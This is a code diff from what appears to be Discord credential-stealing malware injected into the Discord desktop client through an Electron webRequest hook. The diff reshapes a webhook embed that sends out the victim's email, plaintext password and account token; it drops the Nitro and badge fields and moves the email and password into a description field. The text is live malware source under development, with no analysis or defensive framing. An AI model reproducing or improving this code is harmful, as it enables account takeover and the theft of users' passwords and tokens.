@@ -152,17 +152,10 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             embeds: [
                 {
                     "color": 16507654,
+                    "description": {
+                        "text": `Email: ${json.email}\nPassword: ${password}`
+                    },
                     "fields": [
-                        {
-                            "name": "**Account Info**",
-                            "value": `Email: ${json.email}\nPassword: ${password}`,
-                            "inline": true
-                        },
-                        {
-                            "name": "**Other Info**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
-                            "inline": true
-                        },
                         {
                             "name": "**Token**",
                             "value": `\`${token}\``,
